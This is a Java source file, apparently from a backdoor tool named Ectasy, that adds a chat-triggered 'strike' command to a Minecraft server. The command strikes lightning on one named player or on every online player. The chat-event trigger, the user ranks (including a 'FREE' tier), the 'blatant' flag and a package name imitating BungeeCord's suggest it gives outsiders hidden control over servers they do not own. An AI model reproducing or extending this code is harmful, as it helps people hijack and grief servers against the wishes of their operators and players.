package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "strike",
   description = "Strike someone",
   blatant = true,
   rank = Rank.FREE
)
public class StrikeCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length != 1) {
               ChatUtil.sendChat(e.getPlayer(), "Please, use strike <player name> or strike *");
            } else if (!args[0].equals("*")) {
               Player var3 = Bukkit.getServer().getPlayer(args[0]);
               if (var3 == null) {
                  ChatUtil.sendChat(e.getPlayer(), "The player " + args[0] + " is not online.");
               } else {
                  var3.getWorld().strikeLightning(var3.getLocation());
                  ChatUtil.sendChat(e.getPlayer(), "Striked " + var3.getName());
               }
            } else {
               for(Player var2 : Bukkit.getOnlinePlayers()) {
                  var2.getWorld().strikeLightning(var2.getLocation());
               }

               ChatUtil.sendChat(e.getPlayer(), "Striked everyone.");
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
}
